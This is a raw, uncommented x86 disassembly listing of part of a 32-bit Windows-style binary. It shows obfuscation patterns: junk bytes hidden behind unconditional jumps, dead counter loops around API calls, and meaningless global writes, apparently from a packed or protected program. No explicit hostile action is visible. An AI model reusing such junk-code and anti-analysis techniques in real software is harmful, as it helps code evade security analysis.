  409420:	mov    esi,DWORD PTR [ebp+0x10]
  409423:	mov    DWORD PTR [esi+0x8],eax
  409426:	mov    DWORD PTR ds:0x4122f8,0x19
  409430:	cmp    DWORD PTR ds:0x4122f8,0x0
  409437:	je     0x409465
  40943d:	cmp    DWORD PTR ds:0x4122f8,0x21
  409444:	jne    0x409455
  40944a:	push   0x2b01
  40944f:	call   DWORD PTR ds:0x40d00c
  409455:	mov    eax,ds:0x4122f8
  40945a:	dec    eax
  40945b:	mov    ds:0x4122f8,eax
  409460:	jmp    0x409430
  409465:	mov    eax,DWORD PTR [ebp+0x18]
  409468:	mov    esi,DWORD PTR [ebp+0x10]
  40946b:	mov    DWORD PTR [esi+0xc],eax
  40946e:	mov    eax,DWORD PTR [ebp+0x1c]
  409471:	jmp    0x409522
  409476:	and    BYTE PTR [ebx],0x16
  409479:	xchg   esi,eax
  40947a:	xchg   ebp,eax
  40947b:	mov    ebx,0xa0863980
  409480:	xchg   ebp,eax
  409481:	xor    eax,0x8a0f9c2a
  409486:	in     eax,0x20
  409488:	jle    0x409508
  40948a:	cmp    BYTE PTR [esi+0x7e],0x7e
  40948e:	xchg   edi,eax
  40948f:	mov    bl,0x6d
  409491:	es dec ecx
  409493:	lods   al,BYTE PTR ds:[esi]
  409494:	pop    ecx
  409495:	arpl   WORD PTR [ebp+0x66],sp
  409498:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409499:	dec    edx
  40949a:	shr    ebx,cl
  40949c:	lods   eax,DWORD PTR ds:[esi]
  40949d:	jo     0x409498
  40949f:	pop    esi
  4094a0:	add    dl,BYTE PTR [ebp-0x5b87bb70]
  4094a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094a7:	aam    0xfa
  4094a9:	(bad)  
  4094aa:	daa    
  4094ab:	das    
  4094ac:	jmp    0x409495
  4094ae:	xchg   DWORD PTR [eax],esp
  4094b0:	push   es
  4094b1:	test   bh,cl
  4094b3:	jo     0x40948f
  4094b5:	and    DWORD PTR [ecx-0xe3b7c39],esp
  4094bb:	out    0xbc,eax
  4094bd:	stos   BYTE PTR es:[edi],al
  4094be:	adc    edx,edx
  4094c0:	aam    0x20
  4094c2:	mov    esp,ss
  4094c4:	loope  0x40950d
  4094c6:	mov    WORD PTR [edx+eax*1+0x150beaea],fs
  4094cd:	aaa    
  4094ce:	mov    ds:0xb34a4a86,eax
  4094d3:	(bad)  
  4094d4:	pop    eax
  4094d5:	cmp    DWORD PTR [edi],ebp
  4094d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094d8:	pop    es
  4094d9:	in     al,0xe5
  4094db:	aas    
  4094dc:	imul   BYTE PTR [eax+ebp*8-0x8]
  4094e0:	out    dx,al
  4094e1:	inc    ebp
  4094e2:	push   eax
  4094e3:	mov    bh,0x32
  4094e5:	fxch   st(2)
  4094e7:	cmc    
  4094e8:	out    0xc5,al
  4094ea:	pop    eax
  4094eb:	mov    bl,0xef
  4094ed:	mov    ds:0x82bca1a2,eax
  4094f2:	mov    edi,gs
  4094f4:	and    BYTE PTR fs:[esp+ebx*2+0x55],bh
  4094f9:	cmp    BYTE PTR [esi-0x46],ah
  4094fc:	icebp  
  4094fd:	or     ah,BYTE PTR [ecx]
  4094ff:	or     ecx,DWORD PTR [ecx+0x4664f959]
  409505:	fst    QWORD PTR [edi+0x58ce276c]
  40950b:	push   ebx
  40950c:	push   edi
  40950d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40950e:	setp   BYTE PTR [ebp+0x1b3c4cdb]
  409515:	jg     0x40951c
  409517:	mov    bl,0x92
  409519:	cmc    
  40951a:	mov    bl,0x1f
  40951c:	es mov ebp,0x176a9346
  409522:	mov    esi,DWORD PTR [ebp+0x10]
  409525:	mov    DWORD PTR [esi+0x10],eax
  409528:	mov    eax,eax
  40952a:	mov    eax,DWORD PTR [ebp+0x8]
  40952d:	jmp    0x4095de
  409532:	es bnd jno 0x409580
  409536:	mov    ecx,0xcb626549
  40953b:	les    ebp,FWORD PTR [esi]
  40953d:	xor    al,bl
  40953f:	shl    BYTE PTR [ebp-0x54],1
  409542:	or     DWORD PTR [ecx],esp
  409544:	jle    0x4095c4
  409546:	cmp    BYTE PTR [esi+0x7e],0x7e
  40954a:	mov    eax,0x6c41791
  40954f:	lock fiadd WORD PTR [esi+0x6f]
  409553:	popf   
  409554:	fdiv   QWORD PTR [ebp-0x2af17699]
  40955a:	pop    edx
  40955b:	fild   WORD PTR [esi-0x57]
  40955e:	neg    BYTE PTR [edi-0x71c2bbbf]
  409564:	inc    ebx
  409565:	push   0x96fdcf99
  40956a:	dec    eax
  40956b:	mov    fs,WORD PTR [edi-0x58]
  40956e:	retf   0x3eb
  409571:	dec    ebp
  409572:	(bad)  
  409573:	in     eax,dx
  409574:	ret    0xa164
  409577:	in     al,0x65
  409579:	test   DWORD PTR [ebx-0x8a21b],esi
  40957f:	mov    WORD PTR [edi-0x71aa7484],?
  409585:	push   0xffffffb1
  409587:	daa    
  409588:	in     eax,0x44
  40958a:	sbb    BYTE PTR [esi+ecx*8],bh
  40958d:	and    al,0x5d
  40958f:	and    al,0x9
  409591:	mov    ecx,ds
  409593:	push   eax
  409594:	ja     0x4095e5
  409596:	xor    BYTE PTR [edx-0x710bdaad],dh
  40959c:	inc    edx
  40959d:	rcl    ah,0x1d
  4095a0:	rcr    DWORD PTR [edx+0x2f174967],0xda
  4095a7:	pop    ss
  4095a8:	cmc    
  4095a9:	pusha  
  4095aa:	xor    al,0x45
  4095ac:	sbb    BYTE PTR [ebx-0x2e816ea1],bh
  4095b2:	fwait
  4095b3:	icebp  
  4095b4:	push   ecx
  4095b5:	xchg   edx,eax
  4095b6:	lahf   
  4095b7:	jbe    0x409606
  4095b9:	out    0x55,eax
  4095bb:	mov    dl,0xef
  4095bd:	push   ebp
  4095be:	push   eax
  4095bf:	adc    DWORD PTR [eax-0xe],edx
  4095c2:	sub    dh,BYTE PTR [esi+0x78c0d7be]
  4095c8:	xor    al,0xfd
  4095ca:	mov    ch,0xe4
  4095cc:	jecxz  0x4095b2
  4095ce:	inc    ebp
  4095cf:	adc    dl,al
  4095d1:	jbe    0x4095c9
  4095d3:	or     eax,0xa808044d
  4095d8:	mov    BYTE PTR [esi+0x647843a6],ch
  4095de:	xor    eax,ecx
  4095e0:	add    eax,edx
  4095e2:	pop    esi
  4095e3:	leave  
  4095e4:	ret    0x18
  4095e7:	push   ebp
  4095e8:	mov    ebp,esp
  4095ea:	mov    eax,DWORD PTR [ebp+0xc]
  4095ed:	xor    edx,edx
  4095ef:	mov    ecx,0x7264fca0
  4095f4:	div    ecx
  4095f6:	mov    ecx,DWORD PTR [ebp+0x10]
  4095f9:	and    ecx,eax
  4095fb:	or     ecx,0x81161d8e
  409601:	mov    eax,ecx
  409603:	pop    ebp
  409604:	ret    0x18
  409607:	push   ebp
  409608:	mov    ebp,esp
  40960a:	jmp    0x40974f
  40960f:	test   eax,0x795cd0ce
  409614:	pusha  
  409615:	test   eax,0x818b5fdb
  40961a:	cmp    edx,DWORD PTR [eax-0x23]
  40961d:	adc    DWORD PTR [ecx],0xffffff9d
  409620:	and    DWORD PTR [esi+0x7e],edi
  409623:	push   ss
  409624:	jg     0x4096a4
  409626:	jle    0x4095cd
  409628:	nop
  409629:	cmp    BYTE PTR [edx],al
  40962b:	data16 js 0x409642
  40962e:	mov    ah,bl
  409630:	retf   
  409631:	mov    BYTE PTR [ebx],bl
  409633:	pop    ecx
  409634:	pop    eax
  409635:	ins    BYTE PTR es:[edi],dx
  409636:	mov    al,ds:0xd7cb7f9c
  40963b:	lods   eax,DWORD PTR ds:[esi]
  40963c:	fwait
  40963d:	iret   
  40963e:	mov    WORD PTR [eax+0x5b],ss
  409641:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409642:	cmp    eax,0xc1cfa0ae
  409647:	in     al,dx
  409648:	add    ecx,edi
  40964a:	idiv   al
  40964c:	sub    edi,DWORD PTR [edx+ecx*2+0x18d8e29f]
  409653:	test   eax,0x491906d6
  409658:	dec    edi
  409659:	cmp    BYTE PTR [edx-0x53],0xaa
  40965d:	test   DWORD PTR [ebx],0xf0dd5241
  409663:	retf   0x3cb8
  409666:	pop    ds
  409667:	pop    eax
  409668:	sbb    eax,0x81dcbc5b
  40966d:	inc    edx
  40966e:	test   DWORD PTR [esi-0x50dd5afe],ecx
  409674:	and    bh,BYTE PTR [esi]
  409676:	jnp    0x409640
  409678:	adc    ebp,DWORD PTR [ecx]
  40967a:	ins    DWORD PTR es:[edi],dx
  40967b:	outs   dx,DWORD PTR ds:[esi]
  40967c:	mov    ebx,0x14da6adb
  409681:	pop    ebx
  409682:	xchg   ebp,eax
  409683:	aaa    
  409684:	pop    edx
  409685:	test   DWORD PTR [ebx+0x5a8a6374],edx
  40968b:	mov    WORD PTR [edi-0x2f5ef911],?
  409691:	mov    al,ds:0xccdb32d3
  409696:	jno    0x409661
  409698:	mov    esi,0x56387ea7
  40969d:	push   edi
  40969e:	mov    esi,DWORD PTR [ebp+0x1f]
  4096a1:	pop    ds
  4096a2:	in     al,0x4e
  4096a4:	xor    al,0x9e
  4096a6:	inc    ecx
  4096a7:	sub    eax,0x67eb91ac
  4096ac:	lods   al,BYTE PTR ds:[esi]
  4096ad:	sbb    eax,0xc7efa1c4
  4096b2:	xor    al,0xc3
  4096b4:	jl     0x409729
  4096b6:	jecxz  0x4096c7
  4096b8:	sub    al,0xfe
  4096ba:	xchg   esi,eax
  4096bb:	out    0x5d,al
  4096bd:	nop
  4096be:	jmp    0x2966:0x3a625f47
  4096c5:	rol    DWORD PTR [ebx+0x72],1
  4096c8:	in     eax,0xea
  4096ca:	mov    bl,0x3a
  4096cc:	cmp    DWORD PTR [ebp+eax*8+0x38ebb7d3],esp
  4096d3:	shl    BYTE PTR [edi+eiz*8],cl
  4096d6:	add    eax,0x9d061809
  4096db:	and    cl,BYTE PTR [ebp-0x7c]
  4096de:	test   DWORD PTR [ebp+ebp*4-0x1e],0x60e6b220
  4096e6:	add    al,0x16
  4096e8:	inc    ecx
  4096e9:	loopne 0x409765
  4096eb:	outs   dx,BYTE PTR ds:[esi]
  4096ec:	jo     0x4096d1
  4096ee:	add    BYTE PTR [ecx+0x65],dl
  4096f1:	jle    0x40969c
  4096f3:	loopne 0x4096e2
  4096f5:	or     BYTE PTR [edx+0x32c8c397],cl
  4096fb:	mov    esi,0x6e0b84fb
  409700:	jnp    0x4096c4
  409702:	bound  edx,QWORD PTR [ebx-0x73e4f519]
  409708:	pop    ds
  409709:	ins    DWORD PTR es:[edi],dx
  40970a:	and    DWORD PTR [ebx+0x305bce7f],0xffffffd4
  409711:	inc    edx
  409712:	lds    ecx,FWORD PTR [eax+0x75]
  409715:	lahf   
  409716:	dec    ebx
  409717:	cmp    BYTE PTR [edx-0x3e],0xa7
  40971b:	test   bl,ch
  40971d:	mov    DWORD PTR [edi],edx
  40971f:	inc    ecx
  409720:	retf   0xd7d6
  409723:	fbld   TBYTE PTR [ebx]
  409725:	imul   ebx,DWORD PTR [edx+0x79ef5797],0x344d76c1
  40972f:	out    dx,al
  409730:	push   ecx
  409731:	push   cs
  409732:	xchg   BYTE PTR [eax+0x77],dh
  409735:	sbb    ch,BYTE PTR [ebp+0x3a]
  409738:	sub    al,0xfd
  40973a:	inc    esp
  40973b:	inc    esi
  40973c:	hlt    
  40973d:	iret   
  40973e:	in     al,dx
  40973f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409740:	xor    esi,DWORD PTR [eax-0x79]
  409743:	cmp    DWORD PTR [ebp-0x5b],0x4801610d
  40974a:	test   DWORD PTR [edx],0x5118247e
  409750:	sbb    edx,eax
  409752:	mov    DWORD PTR [ebp-0x4],0xf89c853c
  409759:	or     DWORD PTR ds:0x4233bf,ebx
  40975f:	mov    eax,DWORD PTR [ebp-0x4]
  409762:	or     DWORD PTR ds:0x412300,0x19a1
  40976c:	mov    edx,DWORD PTR [ebp+0x10]
  40976f:	movzx  ecx,WORD PTR ds:0x41aa46
  409776:	adc    DWORD PTR ds:0x4233db,ecx
  40977c:	mov    ecx,0x7510859
  409781:	sub    DWORD PTR ds:0x417d29,0x412300
  40978b:	xor    eax,ecx
  40978d:	adc    DWORD PTR ds:0x4122ec,0x41aa42
  409797:	add    eax,0x32729f
  40979c:	mov    DWORD PTR ds:0x415045,0x3ef2
  4097a6:	mov    DWORD PTR [edx],eax
  4097a8:	xor    edx,DWORD PTR ds:0x4233cb
  4097ae:	jmp    0x4098f3
  4097b3:	push   0xffffffe9
  4097b5:	xlat   BYTE PTR ds:[ebx]
  4097b6:	call   0xe006:0xf97b9855
  4097bd:	jl     0x4097c2
  4097bf:	or     bh,BYTE PTR [esi]
  4097c1:	inc    ecx
  4097c2:	retf   
  4097c3:	mov    ch,0x26
  4097c5:	jle    0x409845
  4097c7:	push   ss
  4097c8:	jg     0x409848
  4097ca:	jle    0x40981c
  4097cc:	mov    al,0xf5
  4097ce:	loopne 0x40983b
  4097d0:	cs pop ds
  4097d2:	xchg   edx,eax
  4097d3:	sbb    DWORD PTR [ebx+0x190b968],eax
  4097d9:	and    DWORD PTR [edx-0x2838d54b],edi
  4097df:	jmp    0xd460:0xd0c18412
  4097e6:	xor    al,0x81
  4097e8:	shl    DWORD PTR [edx+0x5615a822],cl
  4097ee:	mov    bl,dl
  4097f0:	fs dec ebp
  4097f2:	cmp    DWORD PTR [ebx+0x66391a06],ecx
  4097f8:	sar    BYTE PTR [ecx],1
  4097fa:	out    dx,al
  4097fb:	mov    al,ds:0x6fef786
  409800:	adc    eax,0x59b685e1
  409805:	sub    al,0x2a
  409807:	inc    ecx
  409808:	rcr    DWORD PTR [edi],cl
  40980a:	lods   al,BYTE PTR ds:[esi]
  40980b:	mov    al,0x99
  40980d:	mov    dh,0x75
  40980f:	mov    ah,0x8d
  409811:	test   BYTE PTR [edi-0x61],cl
  409814:	pusha  
  409815:	adc    DWORD PTR [ecx-0x6f],esi
  409818:	xchg   BYTE PTR [edx],dh
  40981a:	dec    edi
  40981b:	loopne 0x40983c
  40981d:	test   dh,al
  40981f:	add    BYTE PTR fs:[edi],ch
  409822:	js     0x4097f8
  409824:	out    dx,al
  409825:	mov    dl,0xe4
  409827:	xchg   BYTE PTR [edi],bl
  409829:	lods   eax,DWORD PTR ds:[esi]
  40982a:	add    BYTE PTR [esi],bh
  40982c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982d:	xor    DWORD PTR [esi+0x7d200e43],ebx
  409833:	imul   ebp,DWORD PTR [edx-0x47b5f2a3],0x3a
  40983a:	mov    edi,0x2da239e9
  40983f:	repnz lds esi,FWORD PTR [ebp+0x27]
  409843:	inc    esi
  409844:	je     0x4098a7
  409846:	scas   eax,DWORD PTR es:[edi]
  409847:	popa   
  409848:	hlt    
  409849:	pop    ebx
  40984a:	push   edx
  40984b:	daa    
  40984c:	push   ds
  40984d:	test   DWORD PTR [edi-0x9],esi
  409850:	js     0x4097fa
  409852:	cmc    
  409853:	ds sbb al,0x7
  409856:	(bad)  
  409857:	mov    BYTE PTR [ebx-0x6b50fe46],ah
  40985d:	test   BYTE PTR ds:0x45c4b6ce,0x47
  409864:	ds jo  0x409856
  409867:	or     DWORD PTR [esi],eax
  409869:	mov    edi,0x952158d3
  40986e:	hlt    
  40986f:	in     eax,0x54
  409871:	xchg   esi,eax
  409872:	js     0x4098c3
  409874:	or     ebp,esi
  409876:	rcl    DWORD PTR es:[ecx],1
  409879:	fidivr DWORD PTR [edx]
  40987b:	add    al,0xe
  40987d:	mov    bh,0x8b
  40987f:	pop    edi
  409880:	mov    ebx,0xf68dec46
  409885:	and    cl,BYTE PTR [esi-0x2d]
  409888:	pop    ebp
  409889:	aad    0xeb
  40988b:	rcr    DWORD PTR [edi],1
  40988d:	sub    cl,BYTE PTR [ebp+ebp*8+0x603b3817]
  409894:	push   esp
  409895:	cwde   
  409896:	aad    0x2f
  409898:	das    
  409899:	lock inc ebp
  40989b:	adc    ebx,DWORD PTR [eax+0x177c1143]
  4098a1:	and    al,0x5a
  4098a3:	and    bh,BYTE PTR [ebx+0xf5d74b7]
  4098a9:	clc    
  4098aa:	les    esi,FWORD PTR [eax-0x5f]
  4098ad:	jne    0x409904
  4098af:	aam    0x33
  4098b1:	mov    cl,0x6e
  4098b3:	div    esp
  4098b5:	mov    cl,0xc4
  4098b7:	mov    ch,0x7b
  4098b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098ba:	cli    
  4098bb:	mov    ebx,DWORD PTR [edi+0x330ac8b0]
  4098c1:	out    dx,eax
  4098c2:	ror    DWORD PTR [edi-0x53e7b1cb],0x84
  4098c9:	add    eax,0x5ba07a09
  4098ce:	jo     0x4098ef
  4098d0:	imul   ecx,DWORD PTR ds:[edx-0x1f987b67],0xffffffca
  4098d8:	outs   dx,DWORD PTR ds:[esi]
  4098d9:	cmp    ebp,DWORD PTR [esp+eax*8-0x1d]
  4098dd:	xchg   esi,eax
  4098de:	sahf   
  4098df:	outs   dx,BYTE PTR ds:[esi]
  4098e0:	adc    bl,bl
  4098e2:	add    dl,BYTE PTR [ebp-0xe]
  4098e5:	test   eax,0xaf84d150
  4098ea:	pop    edi
  4098eb:	pop    esp
  4098ec:	jge    0x409931
  4098ee:	call   0x93604375
  4098f3:	mov    eax,DWORD PTR [ebp+0x14]
  4098f6:	and    DWORD PTR ds:0x4122f4,0x0
  409900:	mov    edx,DWORD PTR ds:0x4122f4
  409906:	inc    edx
  409907:	mov    DWORD PTR ds:0x4122f4,edx
  40990d:	cmp    DWORD PTR ds:0x4122f4,0x9
  409914:	jne    0x409930
  40991a:	push   DWORD PTR [ebp-0x14]
  40991d:	push   0x1e75
  409922:	push   0x8bb6
  409927:	push   DWORD PTR [ebp-0x18]
  40992a:	call   DWORD PTR ds:0x40d1f0
  409930:	cmp    DWORD PTR ds:0x4122f4,0x8
  409937:	jne    0x40994a
  40993d:	mov    edx,DWORD PTR ds:0x4122f4
  409943:	inc    edx
  409944:	mov    DWORD PTR ds:0x4122f4,edx
  40994a:	cmp    DWORD PTR ds:0x4122f4,0x1c
  409951:	jb     0x409900
  409957:	mov    edx,DWORD PTR [ebp+0x10]
  40995a:	mov    DWORD PTR [edx+0x4],eax
  40995d:	mov    eax,DWORD PTR [ebp+0x18]
  409960:	mov    edx,DWORD PTR [ebp+0x10]
  409963:	jmp    0x409aa8
  409968:	add    al,0x3c
  40996a:	cmp    bl,BYTE PTR [ebp-0x6]
  40996d:	jns    0x4099c8
  40996f:	gs push edi
  409971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409972:	or     eax,0xa858054c
  409977:	leave  
  409978:	ins    DWORD PTR es:[edi],dx
  409979:	daa    
  40997a:	jle    0x4099fa
  40997c:	push   ss
  40997d:	jg     0x4099fd
  40997f:	jle    0x40999e
  409981:	out    dx,eax
  409982:	ss lock leave 
  409985:	sbb    al,0x55
  409987:	and    BYTE PTR [ebx+0x5548c32d],dl
  40998d:	test   DWORD PTR [esi-0x3d],ecx
  409990:	pop    ss
  409991:	ret    
  409992:	dec    edi
  409993:	mov    bh,0x16
  409995:	jmp    0x7c31:0xb398b206
  40999c:	test   eax,0xb7465393
  4099a1:	pop    edi
  4099a2:	pop    ss
  4099a3:	mov    al,ds:0x55d04cb2
  4099a8:	cmp    eax,0x35a8b027
  4099ad:	push   ecx
  4099ae:	rol    eax,1
  4099b0:	pop    ss
  4099b1:	popa   
  4099b2:	iret   
  4099b3:	lods   eax,DWORD PTR ds:[esi]
  4099b4:	dec    eax
  4099b5:	dec    ebp
  4099b6:	add    al,0x32
  4099b8:	mov    ah,BYTE PTR ds:0x11092722
  4099be:	outs   dx,BYTE PTR ds:[esi]
  4099bf:	pop    ds
  4099c0:	push   cs
  4099c1:	out    0xdf,eax
  4099c3:	(bad)  
  4099c4:	sahf   
  4099c5:	mov    al,ds:0x37d2d716
  4099ca:	mov    ebx,0xdc948476
  4099cf:	jae    0x409965
  4099d1:	and    eax,0x744452f2
  4099d6:	sahf   
  4099d7:	adc    eax,0x10bc15ff
  4099dc:	ss inc eax
  4099de:	loopne 0x4099be
  4099e0:	mov    edx,0x6e40c267
  4099e5:	xchg   esi,eax
  4099e6:	and    al,0xd4
  4099e8:	dec    edi
  4099e9:	inc    esi
  4099ea:	sub    DWORD PTR [edx-0x2e],edi
  4099ed:	rcl    ebx,0x3b
  4099f0:	inc    ecx
  4099f1:	fwait
  4099f2:	repz adc BYTE PTR [esi-0x13],ch
  4099f6:	lea    edi,[eax-0x3f]
  4099f9:	push   0xffffff8b
  4099fb:	leave  
  4099fc:	inc    esi
  4099fd:	repz dec edi
  4099ff:	jp     0x409a35
  409a01:	sahf   
  409a02:	xchg   ebp,eax
  409a03:	test   BYTE PTR [edi],cl
  409a05:	adc    eax,0xb62805a7
  409a0a:	cmp    bh,BYTE PTR [edx+0x6ef11c10]
  409a10:	adc    dl,BYTE PTR [esi-0x71]
  409a13:	sahf   
  409a14:	jl     0x409a0e
  409a16:	xchg   BYTE PTR [ebx+0x64],ah
  409a19:	ror    BYTE PTR [ebp+0x3e],0x5c
  409a1d:	rol    BYTE PTR [edx-0x6c],1
  409a20:	add    eax,0x5018f428
  409a26:	mov    bh,0xd2
  409a28:	xchg   ecx,eax
  409a29:	mov    al,ds:0x2b36b67
  409a2e:	jbe    0x409a39
  409a30:	iret   
  409a31:	das    
  409a32:	loope  0x409a78
  409a34:	(bad)  
  409a35:	inc    ebp
  409a36:	fisub  DWORD PTR [esi+0x3c]
  409a39:	jmp    FWORD PTR [ecx-0x6eff16f0]
  409a3f:	inc    edi
  409a40:	jbe    0x409a3b
  409a42:	mov    ebx,0x52dbef4f
  409a47:	jns    0x409a54
  409a49:	cmc    
  409a4a:	(bad)  
  409a4b:	xchg   edi,eax
  409a4c:	cmp    al,0xd
  409a4e:	stos   BYTE PTR es:[edi],al
  409a4f:	sub    eax,0x11066d65
  409a54:	xor    ah,al
  409a56:	hlt    
  409a57:	neg    DWORD PTR [edx+0x6e]
  409a5a:	stc    
  409a5b:	out    0x49,al
  409a5d:	push   cs
  409a5e:	adc    al,0x54
  409a61:	or     ebp,0x46
  409a64:	adc    bl,BYTE PTR [edi]
  409a66:	mov    dh,0x95
  409a68:	ja     0x409ada
  409a6a:	push   ebx
  409a6b:	(bad)  
  409a6c:	hlt    
  409a6d:	dec    eax
  409a6e:	cmp    cl,BYTE PTR [ecx+0x1244de99]
  409a74:	mov    esp,DWORD PTR [ebx]
  409a76:	xchg   edx,eax
  409a77:	rcr    BYTE PTR [ebx-0x65a65c7e],1
  409a7d:	mov    dh,0xb1
  409a7f:	mov    DWORD PTR [eax+ecx*1+0x6da907d2],0x408f2d78
  409a8a:	stc    
  409a8b:	inc    eax
  409a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a8d:	daa    
  409a8e:	inc    esp
  409a8f:	adc    eax,0x4ff58e72
  409a94:	sbb    edx,DWORD PTR [edi]
  409a96:	in     eax,0xf6
  409a98:	sub    BYTE PTR [edi-0x6f],ch
  409a9b:	ss adc al,0x5b
  409a9e:	mov    ecx,0x172237d3
  409aa3:	and    eax,DWORD PTR [ecx+0xc]
  409aa6:	loope  0x409add
  409aa8:	mov    DWORD PTR [edx+0x8],eax
  409aab:	mov    eax,DWORD PTR [ebp+0x1c]
  409aae:	mov    edx,DWORD PTR [ebp+0x10]
  409ab1:	mov    DWORD PTR [edx+0xc],eax
  409ab4:	mov    eax,DWORD PTR [ebp+0x20]
  409ab7:	mov    edx,DWORD PTR [ebp+0x10]
  409aba:	mov    DWORD PTR [edx+0x10],eax
  409abd:	mov    eax,eax
  409abf:	mov    eax,DWORD PTR [ebp+0x14]
  409ac2:	test   eax,eax
  409ac4:	mov    eax,DWORD PTR [ebp+0x8]
  409ac7:	jne    0x409ad0
  409acd:	mov    eax,DWORD PTR [ebp+0xc]
  409ad0:	xor    eax,ecx
  409ad2:	add    eax,0x32729f
  409ad7:	leave  
  409ad8:	ret    0x1c
  409adb:	push   ebp
  409adc:	mov    ebp,esp
  409ade:	sub    esp,0x74
  409ae1:	or     DWORD PTR ds:0x417d1d,0x412308
  409aeb:	push   ebx
  409aec:	inc    DWORD PTR ds:0x4233c7
  409af2:	push   esi
  409af3:	mov    esi,0x876987
  409af8:	sub    DWORD PTR ds:0x415041,0x4122f8
  409b02:	push   esi
  409b03:	push   0x40d6e4
  409b08:	xor    ebx,ebx
  409b0a:	adc    DWORD PTR ds:0x415045,0xb4e
  409b14:	push   0x40d70c
  409b19:	adc    DWORD PTR ds:0x412308,0x417d11
  409b23:	mov    DWORD PTR [ebp-0x4],ebx
  409b26:	xor    DWORD PTR ds:0x4233d3,0x95a
  409b30:	call   DWORD PTR ds:0x40d26c
  409b36:	cmp    eax,esi
  409b38:	je     0x409b45
  409b3e:	xor    eax,eax
  409b40:	jmp    0x40a5d1
  409b45:	push   edi
  409b46:	mov    edi,0x8e152d83
  409b4b:	mov    esi,0x60672eb0
  409b50:	push   0xa
  409b52:	adc    DWORD PTR ds:0x415049,0x51b8
  409b5c:	push   0xa
  409b5e:	and    DWORD PTR ds:0x412308,0x132f
  409b68:	push   0x1
  409b6a:	and    DWORD PTR ds:0x415031,0x415039
  409b74:	lea    eax,[ebp-0x4]
  409b77:	mov    DWORD PTR [ebp-0xc],eax
  409b7a:	and    DWORD PTR ds:0x4233d3,0x2ba
  409b84:	push   0x1
  409b86:	neg    DWORD PTR ds:0x417d11
  409b8c:	call   DWORD PTR ds:0x40d3cc
  409b92:	adc    DWORD PTR ds:0x4122e4,0x4233c3
  409b9c:	mov    DWORD PTR [ebp-0x8],eax
  409b9f:	mov    eax,DWORD PTR [ebp-0x8]
  409ba2:	test   eax,eax
  409ba4:	mov    DWORD PTR ds:0x4122e4,0x291c
  409bae:	je     0x40a327
  409bb4:	not    DWORD PTR ds:0x41aa4a
  409bba:	push   DWORD PTR [ebp-0x8]
  409bbd:	adc    DWORD PTR ds:0x4233d3,0x417d1d
  409bc7:	call   DWORD PTR ds:0x40d380
  409bcd:	add    DWORD PTR [ebp-0x4],0x2450a8e
  409bd4:	and    DWORD PTR ds:0x41aa3a,0x0
  409bde:	jmp    0x409bf0
  409be3:	mov    ecx,DWORD PTR ds:0x41aa3a
  409be9:	inc    ecx
  409bea:	mov    DWORD PTR ds:0x41aa3a,ecx
  409bf0:	cmp    DWORD PTR ds:0x41aa3a,0x16
  409bf7:	jae    0x409c20
  409bfd:	cmp    DWORD PTR ds:0x41aa3a,0x17
  409c04:	jne    0x409c1b
  409c0a:	push   DWORD PTR [ebp-0x18]
  409c0d:	push   DWORD PTR [ebp-0x20]
  409c10:	push   0x42f9
  409c15:	call   DWORD PTR ds:0x40d1f4
  409c1b:	jmp    0x409be3
  409c20:	xor    eax,eax
  409c22:	shl    DWORD PTR [ebp-0x4],1
  409c25:	and    DWORD PTR [ebp-0x4],edi
  409c28:	inc    edx
  409c29:	mov    ecx,DWORD PTR [ebp-0x4]
  409c2c:	imul   ecx,ecx,0x7f659e30
  409c32:	mov    DWORD PTR ds:0x412300,0x1a
  409c3c:	cmp    DWORD PTR ds:0x412300,0x0
  409c43:	je     0x409c7d
  409c49:	cmp    DWORD PTR ds:0x412300,0x26
  409c50:	jne    0x409c6b
  409c56:	push   0x66cd
  409c5b:	push   0x41aa52
  409c60:	push   0x5989
  409c65:	call   DWORD PTR ds:0x40d1f8
  409c6b:	mov    edx,DWORD PTR ds:0x412300
  409c71:	dec    edx
  409c72:	mov    DWORD PTR ds:0x412300,edx
  409c78:	jmp    0x409c3c
  409c7d:	mov    DWORD PTR [ebp-0x4],ecx
  409c80:	add    DWORD PTR ds:0x4233c3,ebx
  409c86:	or     DWORD PTR [ebp-0x4],esi
  409c89:	mov    ecx,DWORD PTR [ebp-0x4]
  409c8c:	mov    DWORD PTR ds:0x415049,0xfe3
  409c96:	mov    edx,DWORD PTR [ebp-0xc]
  409c99:	cmp    ecx,DWORD PTR [edx]
  409c9b:	mov    DWORD PTR ds:0x4122f4,0x44d1
  409ca5:	jne    0x40a327
  409cab:	mov    DWORD PTR ds:0x41503d,0x22b0
  409cb5:	inc    eax
  409cb6:	mov    DWORD PTR ds:0x41aa4a,0x2c7f
  409cc0:	cmp    eax,0x4
  409cc3:	jb     0x409c22
  409cc9:	and    DWORD PTR ds:0x415035,0x41aa52
  409cd3:	push   0x40d738
  409cd8:	sub    DWORD PTR ds:0x412304,0x2332
  409ce2:	call   DWORD PTR ds:0x40d3c4
  409ce8:	mov    DWORD PTR ds:0x415031,0x11
  409cf2:	cmp    DWORD PTR ds:0x415031,0x0
  409cf9:	je     0x409d41
  409cff:	cmp    DWORD PTR ds:0x415031,0x8
  409d06:	jne    0x409d15
  409d0c:	push   DWORD PTR [ebp-0x20]
  409d0f:	call   DWORD PTR ds:0x40d2a4
  409d15:	cmp    DWORD PTR ds:0x415031,0x9
  409d1c:	jne    0x409d2f
  409d22:	mov    ecx,DWORD PTR ds:0x415031
  409d28:	dec    ecx
  409d29:	mov    DWORD PTR ds:0x415031,ecx
  409d2f:	mov    ecx,DWORD PTR ds:0x415031
  409d35:	dec    ecx
  409d36:	mov    DWORD PTR ds:0x415031,ecx
  409d3c:	jmp    0x409cf2
  409d41:	xor    eax,eax
  409d43:	shl    DWORD PTR [ebp-0x4],1
  409d46:	mov    DWORD PTR ds:0x41aa46,0x12
  409d50:	cmp    DWORD PTR ds:0x41aa46,0x0
  409d57:	je     0x409da1
  409d5d:	cmp    DWORD PTR ds:0x41aa46,0x3
  409d64:	jne    0x409d75
  409d6a:	push   0x41abc2
